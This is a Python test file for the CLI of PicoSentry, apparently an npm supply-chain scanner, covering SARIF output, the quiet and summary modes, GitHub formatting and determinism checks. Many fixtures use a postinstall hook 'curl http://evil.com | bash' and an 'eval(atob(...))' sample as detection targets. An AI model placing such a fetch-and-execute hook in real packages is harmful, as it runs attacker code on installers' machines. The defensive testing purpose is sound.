"""CLI integration tests (2/2): SARIF format units, --format github,
--quiet/--summary, and --verify-determinism.

Split out of test_cli.py (with test_cli_commands.py) so pytest-xdist
--dist=loadfile can balance the ~79s file across workers. Bodies unchanged.
"""

import argparse
import json
import subprocess
import sys

import pytest

from picosentry.scan.formatters import format_sarif
from picosentry.scan.models import Confidence, Finding, ScanResult, ScanStats, Severity

from tests.scan.conftest import make_npm_project as _make_project


class TestSARIFOutput:
    """Validate SARIF v2.1.0 output format."""

    def test_sarif_schema_and_version(self):
        """SARIF output must include $schema and version 2.1.0."""
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=[
                Finding(
                    rule_id="L2-POST-001",
                    severity=Severity.HIGH,
                    confidence=Confidence.EXACT,
                    package="evil@1.0.0",
                    file="evil/package.json",
                    message="Post-install script",
                    evidence="scripts.postinstall",
                    remediation="Remove script",
                ),
            ],
            stats=ScanStats(packages_scanned=1, files_scanned=10, duration_ms=100),
        )
        sarif_str = format_sarif(result)
        sarif = json.loads(sarif_str)

        assert (
            sarif["$schema"]
            == "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json"
        )
        assert sarif["version"] == "2.1.0"

    def test_sarif_has_tool_driver(self):
        """SARIF output must have tool.driver with name and version."""
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=[],
            stats=ScanStats(packages_scanned=0, files_scanned=0, duration_ms=50),
        )
        sarif = json.loads(format_sarif(result))

        driver = sarif["runs"][0]["tool"]["driver"]
        assert driver["name"] == "PicoSentry"
        assert driver["version"] == "0.2.0"

    def test_sarif_finding_level_mapping(self):
        """SARIF level must map CRITICAL/HIGH→error, MEDIUM→warning, LOW/INFO→note."""
        findings = [
            Finding(
                rule_id="L2-POST-001",
                severity=Severity.CRITICAL,
                confidence=Confidence.EXACT,
                package="a@1.0",
                file="a.json",
                message="critical",
                evidence="e",
                remediation="r",
            ),
            Finding(
                rule_id="L2-OBFS-001",
                severity=Severity.HIGH,
                confidence=Confidence.EXACT,
                package="b@1.0",
                file="b.json",
                message="high",
                evidence="e",
                remediation="r",
            ),
            Finding(
                rule_id="L2-LOCK-001",
                severity=Severity.MEDIUM,
                confidence=Confidence.MEDIUM,
                package="c@1.0",
                file="c.json",
                message="medium",
                evidence="e",
                remediation="r",
            ),
            Finding(
                rule_id="L2-TYPO-001",
                severity=Severity.LOW,
                confidence=Confidence.LOW,
                package="d@1.0",
                file="d.json",
                message="low",
                evidence="e",
                remediation="r",
            ),
        ]
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=findings,
            stats=ScanStats(packages_scanned=4, files_scanned=40, duration_ms=200),
        )
        sarif = json.loads(format_sarif(result))
        levels = {r["ruleId"]: r["level"] for r in sarif["runs"][0]["results"]}

        assert levels["L2-POST-001"] == "error"
        assert levels["L2-OBFS-001"] == "error"
        assert levels["L2-LOCK-001"] == "warning"
        assert levels["L2-TYPO-001"] == "note"

    def test_sarif_rule_definitions(self):
        """SARIF must include rule definitions with metadata from RULE_INFO."""
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=[
                Finding(
                    rule_id="L2-POST-001",
                    severity=Severity.HIGH,
                    confidence=Confidence.EXACT,
                    package="evil@1.0.0",
                    file="evil/package.json",
                    message="Post-install script",
                    evidence="scripts.postinstall",
                    remediation="Remove script",
                ),
            ],
            stats=ScanStats(packages_scanned=1, files_scanned=10, duration_ms=100),
        )
        sarif = json.loads(format_sarif(result))

        rules = sarif["runs"][0]["tool"]["driver"]["rules"]
        assert len(rules) == 1
        assert rules[0]["id"] == "L2-POST-001"
        assert "name" in rules[0]
        assert "shortDescription" in rules[0]
        assert rules[0]["properties"]["category"] in (
            "execution",
            "dependency",
            "obfuscation",
            "credential",
            "provenance",
            "lockfile",
            "typosquat",
            "manifest",
            "maintainer",
        )

    def test_sarif_references_included(self):
        """SARIF finding with references must include them in properties."""
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=[
                Finding(
                    rule_id="L2-POST-001",
                    severity=Severity.HIGH,
                    confidence=Confidence.EXACT,
                    package="evil@1.0.0",
                    file="evil/package.json",
                    message="Post-install script",
                    evidence="scripts.postinstall",
                    remediation="Remove script",
                    references=["https://example.com/advisory"],
                ),
            ],
            stats=ScanStats(packages_scanned=1, files_scanned=10, duration_ms=100),
        )
        sarif = json.loads(format_sarif(result))
        props = sarif["runs"][0]["results"][0]["properties"]
        assert "references" in props
        assert "https://example.com/advisory" in props["references"]

    def test_sarif_deterministic_output(self):
        """Two SARIF outputs from same input must be byte-identical."""
        findings = [
            Finding(
                rule_id="L2-POST-001",
                severity=Severity.HIGH,
                confidence=Confidence.EXACT,
                package="evil@1.0.0",
                file="evil/package.json",
                message="Post-install script",
                evidence="scripts.postinstall",
                remediation="Remove script",
            ),
            Finding(
                rule_id="L2-OBFS-001",
                severity=Severity.CRITICAL,
                confidence=Confidence.HIGH,
                package="obf@2.0.0",
                file="obf/index.js",
                message="eval() usage",
                evidence="eval(atob('...'))",
                remediation="Remove eval",
            ),
        ]
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=findings,
            stats=ScanStats(packages_scanned=2, files_scanned=20, duration_ms=150),
        )
        sarif_a = format_sarif(result)
        sarif_b = format_sarif(result)
        assert sarif_a == sarif_b

    def test_sarif_sorted_keys(self):
        """SARIF JSON must have sorted keys for determinism."""
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=[
                Finding(
                    rule_id="L2-POST-001",
                    severity=Severity.HIGH,
                    confidence=Confidence.EXACT,
                    package="evil@1.0.0",
                    file="evil/package.json",
                    message="test",
                    evidence="e",
                    remediation="r",
                ),
            ],
            stats=ScanStats(packages_scanned=1, files_scanned=10, duration_ms=100),
        )
        sarif_str = format_sarif(result)
        parsed = json.loads(sarif_str)
        # Re-serialize with sorted_keys — must be identical
        reserialized = json.dumps(parsed, sort_keys=True, indent=2)
        assert sarif_str == reserialized


class TestQuietAndSummary:
    """Test --quiet and --summary CLI flags."""

    def test_worker_operational_error_becomes_scan_error(self, tmp_path):
        """Operational errors from the worker queue are surfaced as ScanError."""
        from unittest.mock import patch

        import picosentry.scan.cli_commands.scan as scan_module
        from picosentry.scan.cli_commands.scan import _run_scan
        from picosentry.scan.config import PicoSentryConfig

        project = _make_project(tmp_path, {"name": "x", "version": "1.0.0"})

        config = PicoSentryConfig()
        with (
            patch.object(config, "merge_cli", return_value=config),
            patch.object(scan_module, "_scan_worker") as mock_worker,
        ):
            # Simulate the worker leaving an error marker in the queue.
            def _put_error(*args, **kwargs):
                result_queue = args[-1]
                result_queue.put(("error", "engine blew up"))

            mock_worker.side_effect = _put_error
            with pytest.raises(scan_module.ScanError, match="engine blew up"):
                _run_scan(argparse.Namespace(timeout=1), project, merged_config=config)

    def test_summary_clean_project(self, tmp_path):
        """--summary on project with only minor findings should work."""
        project = _make_project(
            tmp_path,
            {
                "name": "clean-pkg",
                "version": "1.0.0",
                "license": "MIT",
                "repository": {"type": "git", "url": "https://github.com/clean/clean-pkg"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--summary"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 0
        assert "PicoSentry:" in proc.stdout

    def test_summary_with_findings(self, tmp_path):
        """--summary on malicious project should show pinch counts."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--summary"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert "HARD PINCH" in proc.stdout or "SOFT PINCH" in proc.stdout or "NUDGE" in proc.stdout

    def test_quiet_clean_project(self, tmp_path):
        """--quiet on a truly clean project prints the all-clear line."""
        project = _make_project(
            tmp_path,
            {
                "name": "clean-pkg",
                "version": "1.0.0",
                "license": "MIT",
                "engines": {"node": ">=18.0.0"},
                "repository": {"type": "git", "url": "https://github.com/clean/clean-pkg"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--quiet"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 0
        assert "All clear" in proc.stdout

    def test_quiet_with_findings(self, tmp_path):
        """--quiet on malicious project should show summary with rule counts."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--quiet"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert "finding(s)" in proc.stdout
        # Should show rule IDs
        assert "L2-POST-001" in proc.stdout

    def test_summary_implies_quiet(self, tmp_path):
        """--summary should produce one-line output."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--summary"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        # Summary should be a single line (plus possibly a newline)
        lines = [ln for ln in proc.stdout.strip().split("\n") if ln.strip()]
        assert len(lines) == 1

    def test_quiet_with_exit_code(self, tmp_path):
        """--quiet + --exit-code should still exit 1 on findings."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--quiet", "--exit-code"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 1


class TestGitHubFormat:
    """Test --format github output (SARIF file + markdown summary)."""

    def test_github_format_creates_sarif_file(self, tmp_path):
        """--format github should write a SARIF file."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        sarif_path = tmp_path / "results.sarif"

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--format",
                "github",
                "--sarif-file",
                str(sarif_path),
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode in {0, 1}  # may have findings
        assert sarif_path.exists(), "SARIF file should be created"
        sarif_data = json.loads(sarif_path.read_text())
        assert sarif_data["version"] == "2.1.0"
        assert sarif_data["runs"][0]["tool"]["driver"]["name"] == "PicoSentry"

    def test_github_format_markdown_summary(self, tmp_path):
        """--format github should print markdown summary to stdout."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        sarif_path = tmp_path / "results.sarif"

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--format",
                "github",
                "--sarif-file",
                str(sarif_path),
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = proc.stdout
        assert "PicoSentry" in output
        assert "Engine" in output
        assert "Corpus" in output
        assert "SARIF" in output

    def test_github_format_clean_project(self, tmp_path):
        """--format github on clean project with no critical findings."""
        project = tmp_path / "project"
        project.mkdir()
        # Well-maintained package.json that minimizes findings
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "clean-app",
                    "version": "1.0.0",
                    "license": "MIT",
                    "author": "Test Author <test@example.com>",
                    "repository": {"type": "git", "url": "https://github.com/test/clean-app"},
                    "engines": {"node": ">=18.0.0"},
                }
            )
        )
        (project / "package-lock.json").write_text('{"name":"clean-app","lockfileVersion":1}')
        sarif_path = tmp_path / "results.sarif"

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--format",
                "github",
                "--sarif-file",
                str(sarif_path),
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = proc.stdout
        # Either clean or only has low-severity findings
        assert "PicoSentry" in output
        assert "SARIF" in output

    def test_github_format_default_sarif_path(self, tmp_path):
        """--format github without --sarif-file defaults to sarif.json."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--format", "github"],
            capture_output=True,
            text=True,
            timeout=30,
            cwd=str(tmp_path),
        )
        assert (tmp_path / "sarif.json").exists(), "Default sarif.json should be created in cwd"

    def test_github_format_with_exit_code(self, tmp_path):
        """--format github + --exit-code should exit 1 on findings."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        sarif_path = tmp_path / "results.sarif"

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--format",
                "github",
                "--sarif-file",
                str(sarif_path),
                "--exit-code",
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 1  # findings found

    def test_github_format_findings_table(self, tmp_path):
        """--format github should include findings table with rule IDs."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        sarif_path = tmp_path / "results.sarif"

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--format",
                "github",
                "--sarif-file",
                str(sarif_path),
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = proc.stdout
        assert "L2-POST-001" in output
        assert "| Rule |" in output  # findings table header


class TestVerifyDeterminism:
    """Test --verify-determinism CLI flag."""

    def test_verify_determinism_clean_project(self, tmp_path):
        """--verify-determinism on a clean project should exit 0 (identical)."""
        project = _make_project(
            tmp_path,
            {
                "name": "clean-pkg",
                "version": "1.0.0",
                "license": "MIT",
                "repository": {"type": "git", "url": "https://github.com/clean/clean-pkg"},
                "engines": {"node": ">=18.0.0"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--verify-determinism"],
            capture_output=True,
            text=True,
            timeout=120,
        )
        assert proc.returncode == 0, f"Expected exit 0, got {proc.returncode}\nstderr: {proc.stderr}"
        assert "DETERMINISM VERIFIED" in proc.stderr

    def test_verify_determinism_malicious_project(self, tmp_path):
        """--verify-determinism on a project with findings should still exit 0 (deterministic)."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--verify-determinism"],
            capture_output=True,
            text=True,
            timeout=120,
        )
        assert proc.returncode == 0, f"Expected exit 0, got {proc.returncode}\nstderr: {proc.stderr}"
        assert "DETERMINISM VERIFIED" in proc.stderr

    def test_verify_determinism_shows_sha256(self, tmp_path):
        """--verify-determinism should show SHA-256 hashes on stderr."""
        project = _make_project(
            tmp_path,
            {
                "name": "test-sha",
                "version": "1.0.0",
                "license": "MIT",
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--verify-determinism"],
            capture_output=True,
            text=True,
            timeout=120,
        )
        assert proc.returncode == 0
        assert "sha256=" in proc.stderr

    def test_verify_determinism_with_severity_threshold(self, tmp_path):
        """--verify-determinism should work with --severity-threshold."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--verify-determinism",
                "--severity-threshold",
                "high",
            ],
            capture_output=True,
            text=True,
            timeout=120,
        )
        assert proc.returncode == 0
        assert "DETERMINISM VERIFIED" in proc.stderr
